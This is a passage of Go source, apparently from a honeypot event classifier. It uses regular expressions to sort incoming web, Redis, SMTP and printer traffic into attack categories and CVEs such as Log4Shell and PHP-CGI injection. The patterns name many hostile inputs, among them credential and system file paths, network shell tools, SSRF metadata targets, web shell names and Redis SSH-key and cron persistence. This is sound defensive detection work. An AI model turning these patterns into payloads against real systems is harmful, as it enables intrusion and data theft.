	{"CVE-2020-25213", regexp.MustCompile(`/wp-file-manager/lib/php/connector\.minimal\.php`)},                                       // WP File Manager
	{"CVE-2018-1000861", regexp.MustCompile(`descriptorbyname/org\.jenkinsci\.plugins\.scriptsecurity`)},                             // Jenkins
}

// catExploitAny is every catExploits pattern in one, so a request that
// names no known exploit costs a single pass.
var catExploitAny = func() *regexp.Regexp {
	parts := make([]string, len(catExploits))
	for i, e := range catExploits {
		parts[i] = e.re.String()
	}
	return catRe(parts...)
}()

var (
	// Log4Shell: ${jndi:...}, also behind ${lower:j}, ${::-j} or
	// ${env:X:-j} lookups, which catJNDILookup folds away first.
	catJNDI       = regexp.MustCompile(`\$\{\s*jndi\s*:`)
	catJNDILookup = regexp.MustCompile(`\$\{(?:[^${}]*:-|(?:lower|upper|date|main|sys|env|java|base64|bundle|ctx|web|jvmrunargs):)([^${}]*)\}`)
	// PHP-CGI argument injection (CVE-2012-1823; CVE-2024-4577 with %AD).
	catPHPCGI = regexp.MustCompile(`\ballow_url_include\s*=\s*(?:1|on|true)\b|\bauto_prepend_file\s*=`)

	catPathTraversal = catRe(
		`\.\.[/\\]|\.\.;/|[/\\]\.\.(?:$|[?#\s])`,
		`(?:^|[=/\s'"])(?:etc/(?:passwd|shadow|group|hosts|issue)\b|proc/self/(?:environ|cmdline|fd/)|windows/win\.ini|winnt/win\.ini|boot\.ini\b|windows/system32/drivers/etc/hosts)`,
		`\bfile:///?[a-z]`,
	)
	// catRFIRemote captures the remote URL an RFI parameter points at.
	catRFIRemote     = regexp.MustCompile(`[?&](?:page|file|include|inc|path|template|tpl|pg|cat|dir|doc|document|folder|root|style|content|layout|mod|module|conf|config|lang|language|load|show|view|site|theme|skin|header|footer|url|src|dest|data)=((?:https?|ftps?)://\S+)`)
	catFileInclusion = catRe(
		`\b(?:php|expect|phar|zip|glob|compress\.zlib)://`,
		`\bdata:(?://)?(?:text|application)/[a-z-]+[;,]`,
		`[?&](?:page|file|include|inc|path|template|tpl|mosconfig_absolute_path|pg|cat|dir|doc|document|folder|root|style|content|layout|mod|module|conf|config|lang|language|load|show|view|site|base_path|basepath|class_path|includedir|inc_dir|main_path|phpbb_root_path|pm_path|theme|skin|header|footer)=(?:https?|ftps?)://`,
		`\ballow_url_include\b|\bauto_prepend_file\b`,
	)
	catSSRF = catRe(
		`\b(?:`+catMetadataIP+`)\b|\[?fd00:ec2::254|/latest/(?:meta-data|user-data|api/token)\b|/computemetadata/v1\b`,
		`=(?:https?|gopher|dict|ftp)://(?:127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1?\]|0x7f|2130706433|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)`,
		`\b(?:gopher|dict)://`,
	)
	catSQLi = catRe(
		`\bunion\b(?:\s|/\*[^*]*\*/|\()+(?:all\s+|distinct\s+)?\(?\s*select\b`,
		`['"]\s*(?:or|and|\|\||&&)\s+['"]?\d+['"]?\s*=\s*['"]?\d+`,
		`['"]\s*(?:or|and)\s+['"][a-z]+['"]\s*=\s*['"]`,
		`\b(?:or|and)\s+\d+\s*=\s*\d+\s*(?:--|#|/\*|$)`,
		`\b(?:sleep|benchmark|pg_sleep|dbms_pipe\.receive_message)\s*\(\s*\d|\bwaitfor\s+delay\s+'`,
		`\binformation_schema\b|@@version\b|\b(?:extractvalue|updatexml|load_file)\s*\(|\binto\s+(?:out|dump)file\b`,
		`\bconcat(?:_ws)?\s*\(\s*0x[0-9a-f]+|;\s*(?:drop|truncate)\s+table\b|\border\s+by\s+\d+\s*(?:--|#)`,
		`['"]\s*;\s*(?:select|insert|update|delete|drop|exec)\b|\bxp_cmdshell\b`,
	)
	catXSS = catRe(
		`<\s*(?:script|iframe|svg|object|embed|marquee|math)\b`,
		`<\s*(?:img|body|details|video|audio|input|style|a|div|image)\b[^>]*\bon[a-z]+\s*=`,
		`\bjavascript\s*:`,
		`\bon(?:error|load|mouseover|focus|toggle|animationstart|pointerover)\s*=\s*['"]?[^'"\s>]*(?:alert|prompt|confirm|eval|fetch|document\.|window\.)`,
		`\bdocument\.(?:cookie|domain|write)\b`,
	)
	catCommandInjection = catWebCmd(`id|whoami|uname|cat|wget|curl|nc|ncat|netcat|bash|sh|zsh|ping|sleep|echo|busybox|tftp|ftpget|chmod|rm|cd|python[23]?|perl|php|ruby|ls|nslookup|dig|powershell|cmd(?:\.exe)?|telnet|mkfifo|base64|ifconfig|reboot|kill|pkill|nohup`)
	catCodeInjection    = catRe(
		`(?:\{\{|\$\{|#\{|<%=?|\{%)\s*\d+\s*\*\s*\d+\s*(?:\}\}|\}|%>|%\})`,
		`\{\{[^}]*(?:__class__|__globals__|__builtins__|__import__|config\.|self\.|request\.|lipsum|cycler|joiner|namespace|getruntime)`,
		`\$\{[^}]*(?:runtime|processbuilder|java\.lang|freemarker\.template|class\.forname|@java|t\(java)`,
		`#\{[^}]*(?:runtime|java\.lang|getclass)`,
		`%\{\s*\(\s*#|\$\{\s*\(\s*#|#_memberaccess|@ognl\.ognlcontext|#context\[`,
		`<\?php|<\?=`,
		`\b(?:eval|assert|system|passthru|shell_exec|popen|proc_open|call_user_func(?:_array)?|create_function)\s*\(\s*(?:\$_(?:get|post|request|cookie|server)|base64_decode|gzinflate|str_rot13|chr\(|['"])`,
		`\bbase64_decode\s*\(|\b(?:die|print|echo|var_dump)\s*\(?\s*md5\s*\(|\bphpinfo\s*\(\s*\)`,
		`\bo:\d+:"[\w\\]+":\d+:\{|\bro0ab|\baced0005|\b__reduce__\b|\bc__builtin__`,
		`\bclass\.(?:module\.)?classloader\b|runtime\.getruntime\s*\(|\bprocessbuilder\s*\(|\bspring\.cloud\.function\.routing-expression`,
		// PHP code-execution endpoints whose very path runs attacker input.
		`/eval-stdin\.php|\\think\\(?:app|container|request)\b|invokefunction&function=call_user_func`,
	)
	catConfigExposure = catRe(
		`(?:^|/)\.env(?:\.[\w-]+)?(?:$|[?#\s/])`,
		`/\.(?:git|svn|hg|bzr)(?:/|$|\s)`,
		`/\.(?:aws|docker|kube|azure|gcloud|ssh)/`,
		`\bwp-config\.php`,
		`(?:^|/)phpinfo(?:\.php)?\b|/info\.php(?:$|[?\s])|[?&]phpinfo=`,
		`/actuator(?:/|$|\s|\?)|/(?:env|heapdump|jolokia)(?:$|[?\s])`,
		`/server-(?:status|info)\b`,
		`/\.(?:ds_store|htpasswd|npmrc|pypirc|netrc|pgpass|my\.cnf|git-credentials|bash_history|zsh_history|travis\.yml|gitlab-ci\.yml|dockercfg|vscode/|idea/)`,
		`/(?:web\.config|sftp-config\.json|docker-compose(?:\.[\w-]+)?\.ya?ml|appsettings(?:\.\w+)?\.json|application(?:-\w+)?\.(?:properties|ya?ml))\b`,
		`/(?:backup|dump|db|database|data|site|www|wordpress|mysql|sql)\.(?:sql|tar|tar\.gz|tgz|zip|rar|7z|bak)\b`,
		`/[\w-]*config(?:uration)?\.(?:php|inc|json|ya?ml)\.(?:bak|old|save|swp|orig|txt|dist|~)`,
		`/(?:_profiler/phpinfo|telescope/requests|debug/default/view|__debug__|_debugbar)\b`,
		`/(?:credentials|secrets?)(?:\.json|\.txt|\.ya?ml)?(?:$|[?\s])|/id_(?:rsa|dsa|ecdsa|ed25519)\b`,
		`/wp-content/debug\.log|/storage/logs/laravel\.log`,
	)
	catWebShell = catRe(
		`/(?:c99|c100|r57|wso\d*|b374k|alfa(?:shell|-rex|_data)?|indoxploit|xleet|sh3ll|shell\d*|cmd|webshell|priv8|0byte|leafmailer\d*|marijuana|wp-shell|chitoge|haxor|madspot|r00t)\.(?:php\d?|phtml|asp|aspx|jsp)\b`,
		`[?&](?:cmd|exec|command|execute|shell)=(?:id|whoami|uname|ls|dir|pwd|cat|wget|curl|echo|cd|ipconfig|ifconfig|ping|nc|bash|sh|powershell|net|system|ps)\b`,
	)
	catWebUpload = catRe(
		`/(?:upload(?:ify|er|_file)?|fileupload|file_upload|async-upload|ajax[-_]upload)\.(?:php|asp|aspx|jsp|cgi)\b`,
		`/elfinder/php/connector|/kcfinder/upload\.php|/fckeditor/editor/filemanager/|/jquery-file-upload/server/php|/connector\.minimal\.php`,
		`multipart/form-data[^\n]*\n(?:[^\n]*\n)*[^\n]*\bfilename=`,
	)
	catWebProxy = catRe(
		`^\s*connect\s+[\w.-]+:\d+`,
		`^\s*(?:(?:get|post|head)\s+)?https?://(?:[\w-]+\.)*(?:google|baidu|bing|yahoo|wikipedia|amazon|httpbin|azenv|proxyjudge|ip-api|ipinfo|ipify|icanhazip|ifconfig|whatismyip|myip|gstatic|msftconnecttest|duckduckgo|yandex|qq|163|sina)\.`,
		`\bazenv\.php\b|\bproxyjudge\b|/proxy-?check\b`,
	)
	catWebLogin = regexp.MustCompile(`[?&](?:username|user|login|log|uname|usr|email)=[^&\s]+&(?:password|pass|pwd|psd|passwd|pw)=`)
	// catWebProbe is a crawler's or scanner's look around: the front page,
	// robots.txt, an admin or login page, a product fingerprint.
	catWebProbe = regexp.MustCompile(`^(?:(?:get|head|post|options)\s+)?/(?:index\.html?|robots\.txt|sitemap\.xml|favicon\.ico|\.well-known/security\.txt|humans\.txt|ads\.txt|phpmyadmin\d*|pma|myadmin|mysqladmin|dbadmin|sqladmin|adminer(?:\.php)?|manager/html|solr/admin|jenkins/login|login\.action|owa/auth/logon\.aspx|remote/login|global-protect/login\.esp|\+cscoe\+/logon\.html|vpn/index\.html|cgi-bin|boaform/admin/formlogin|hnap1|wp-login\.php|xmlrpc\.php|administrator|admin|user/login|nmaplowercheck\d*|evox/about|sdk|nice ports,/trinity\.txt\.bak|_cat/indices|_nodes|_cluster/health)?/?(?:$|\?\S*$|\s+http/\d)`)

	// Elasticsearch: a search that carries a script (CVE-2014-3120 MVEL,
	// CVE-2015-1427 Groovy).
	catESScript = regexp.MustCompile(`/_(?:search|msearch|update|scripts)\S*\bscript|"script(?:_fields)?"\s*:|\bscript_fields\b`)
	catESRCE    = regexp.MustCompile(`java\.lang|getruntime|\.exec\s*\(|processbuilder|class\.forname|import\s+java`)
)

// catDeobfuscateJNDI folds Log4j lookups that only spell letters, at most
// four levels deep.
func catDeobfuscateJNDI(s string) string {
	for i := 0; i < 4 && strings.Contains(s, "${"); i++ {
		d := catJNDILookup.ReplaceAllString(s, "$1")
		if d == s {
			break
		}
		s = d
	}
	return s
}

func catWeb(in *catInput, s *catSet) {
	w := in.web

	if catExploitAny.MatchString(w) {
		for _, e := range catExploits {
			if e.re.MatchString(w) {
				s.exploit(e.cve)
			}
		}
	}
	if strings.Contains(w, "${") && (catJNDI.MatchString(w) || catJNDI.MatchString(catDeobfuscateJNDI(w))) {
		s.exploit("CVE-2021-44228")
		s.add(CatCodeInjection)
	}
	if catPHPCGI.MatchString(w) {
		cve := "CVE-2012-1823"
		if strings.Contains(in.webRaw, "%ad") {
			cve = "CVE-2024-4577"
		}
		s.exploit(cve)
		s.add(CatCodeInjection)
	}
	// Honeypots that recognise their own vulnerability say so.
	if in.hp == "citrixhoneypot" || in.hp == "ciscoasa" {
		for _, m := range catCVEText.FindAllStringSubmatch(in.any+" "+in.et, catMaxCVEs) {
			if strings.Contains(in.any, "scan") {
				s.add(CatScanning)
			} else {
				s.exploit("CVE-" + m[1] + "-" + m[2])
			}
		}
		if in.hp == "ciscoasa" && strings.Contains(in.et, "exploit") {
			s.exploit("CVE-2018-0101")
		}
	}
	if in.hp == "elasticpot" || strings.Contains(w, "/_search") {
		if catESScript.MatchString(w) {
			s.add(CatDatabaseAbuse)
			if catESRCE.MatchString(w) {
				cve := "CVE-2014-3120"
				if strings.Contains(w, "class.forname") || strings.Contains(w, "groovy") {
					cve = "CVE-2015-1427"
				}
				s.exploit(cve)
				s.add(CatCodeInjection)
			}
		}
	}

	for _, c := range []struct {
		id string
		re *regexp.Regexp
	}{
		{CatPathTraversal, catPathTraversal},
		{CatFileInclusion, catFileInclusion},
		{CatSSRF, catSSRF},
		{CatSQLInjection, catSQLi},
		{CatXSS, catXSS},
		{CatCommandInjection, catCommandInjection},
		{CatCodeInjection, catCodeInjection},
		{CatConfigExposure, catConfigExposure},
		{CatWebShell, catWebShell},
		{CatFileUpload, catWebUpload},
		{CatProxyAbuse, catWebProxy},
		{CatBruteForce, catWebLogin},
	} {
		if c.re.MatchString(w) {
			s.add(c.id)
		}
	}
	if strings.HasSuffix(in.et, ".http.put") || strings.HasPrefix(strings.TrimSpace(w), "put ") {
		s.add(CatFileUpload)
	}
	if strings.HasSuffix(in.et, ".http.connect") {
		s.add(CatProxyAbuse)
	}

	// Commands smuggled into the request.
	dl, _, targets := catDownloads(catWebDownload, w)
	if dl || catDropper.MatchString(w) {
		s.add(CatMalwareDownload)
	}
	// A remote file inclusion whose parameter is an http(s) URL pulls that
	// remote payload in: it is both file-inclusion and a download.
	for _, m := range catRFIRemote.FindAllStringSubmatch(w, 8) {
		s.add(CatMalwareDownload)
		targets = append(targets, m[1])
	}
	catPayloadSigns(w, w, targets, s)
	if catMinerWebExec.MatchString(w) {
		s.add(CatCryptomining)
	}

	if catScannerFingerprint.MatchString(w) {
		s.add(CatScanning)
	}
	if len(s.ids) == 0 && catWebProbe.MatchString(strings.TrimSpace(w)) {
		s.add(CatScanning)
	}
}

// ---------------------------------------------------------------------------
// Other services.
// ---------------------------------------------------------------------------

var (
	catRedisDirOrFile = regexp.MustCompile(`(?:^|\n)\s*config\s+set\s+(?:dir|dbfilename)\b`)
	catRedisPersist   = regexp.MustCompile(`(?:^|\n)\s*config\s+set\s+(?:dir\s+["']?(?:/var/spool/cron|/etc/cron|/etc/?(?:\s|$|["'])|/root/\.ssh|/home/[^/\s]+/\.ssh|/etc/(?:init\.d|profile\.d|systemd))|dbfilename\s+["']?(?:authorized_keys2?|root|crontab|[\w-]+\.service)\b)`)
	catRedisAbuse     = regexp.MustCompile(`(?:^|\n)\s*(?:(?:slaveof|replicaof)\s+\S+\s+\S+|module\s+load\b)`)
	catRedisLuaEscape = regexp.MustCompile(`(?:^|\n)\s*eval(?:sha)?\b[^\n]*(?:package\.loadlib|io\.popen|os\.execute|luaopen_io)`)
	catRedisFlush     = regexp.MustCompile(`(?:^|\n)\s*flush(?:all|db)\b`)
	catRedisAuth      = regexp.MustCompile(`(?:^|\n)\s*auth\s+\S`)
	catRedisProbe     = regexp.MustCompile(`^\s*(?:info|ping|command|dbsize|config\s+get)\b`)
	catRedisCronValue = regexp.MustCompile(`(?i)(?:\*/\d+|\*|\d{1,2})\s+(?:\*|\d{1,2})\s+\*\s+\*\s+\*\s+[a-z/(]`)
	// catRedisCron is a cron job set up through Redis, for the T1053 rule,
	// which reads the command as the honeypot logged it.
	catRedisCron = regexp.MustCompile(`(?i)config\s+set\s+(?:dir\s+["']?(?:/var/spool/cron|/etc/cron)|dbfilename\s+["']?(?:root|crontab)\b)|` + `(?:\*/\d+|\*|\d{1,2})\s+(?:\*|\d{1,2})\s+\*\s+\*\s+\*\s+[a-z/(]`)
	// No left boundary: a key injected through Redis is wrapped in literal
	// "\n\n" padding (SET x "\n\nssh-rsa AAAA..."), so there is a word char
	// right before "ssh". The base64 "aaaa" start keeps it specific.
	catRedisSSHKeyData = regexp.MustCompile(`ssh-(?:rsa|ed25519|dss)\s+aaaa`)

	catSMTPRelay = regexp.MustCompile(`\brcpt\s+to\s*:`)
	catSMTPAuth  = regexp.MustCompile(`\bauth\s+(?:login|plain|cram-md5|xoauth2)\b`)

	catPJLInfo      = regexp.MustCompile(`@pjl\s+(?:info|inquire|dinquire)\b`)
	catPJLTraversal = regexp.MustCompile(`@pjl\s+fs(?:dirlist|query|upload|download|delete|mkdir)\b[^\n]*\.\.[/\\]`)
	catPJLWrite     = regexp.MustCompile(`@pjl\s+fsdownload\b`)
)

func catRedis(in *catInput, s *catSet) {
	t := in.redis
	if catRedisDirOrFile.MatchString(t) || catRedisAbuse.MatchString(t) {
		s.add(CatDatabaseAbuse)
	}
	if catRedisPersist.MatchString(t) || catRedisCronValue.MatchString(t) || catRedisSSHKeyData.MatchString(t) {
		s.add(CatPersistence)
	}
	if catRedisLuaEscape.MatchString(t) {
		s.add(CatDatabaseAbuse)
		if strings.Contains(t, "package.loadlib") || strings.Contains(t, "luaopen_io") {
			s.exploit("CVE-2022-0543")
		}
	}
	if catRedisFlush.MatchString(t) {
		s.add(CatDatabaseAbuse, CatImpact)
	}
	if catRansom.MatchString(t) {
		s.add(CatImpact)
	}
	if catRedisAuth.MatchString(t) {
		s.add(CatBruteForce)
	}
	dl, _, targets := catDownloads(catLooseDownload, t)
	if dl {
		s.add(CatMalwareDownload)
	}
	catPayloadSigns(t, in.redisRaw, targets, s)
	if len(s.ids) == 0 && catRedisProbe.MatchString(t) {
		s.add(CatScanning)
	}
}

func catSMTP(in *catInput, s *catSet) {
	if catSMTPRelay.MatchString(in.smtp) {
		s.add(CatProxyAbuse)
	}
	if catSMTPAuth.MatchString(in.smtp) {
		s.add(CatBruteForce)
	}
}

func catPrinter(in *catInput, s *catSet) {
	if catPJLInfo.MatchString(in.printer) {
		s.add(CatScanning)
	}
	if catPJLTraversal.MatchString(in.printer) {
		s.add(CatPathTraversal)
	}
	if catPJLWrite.MatchString(in.printer) {
		s.add(CatFileUpload)
	}
}
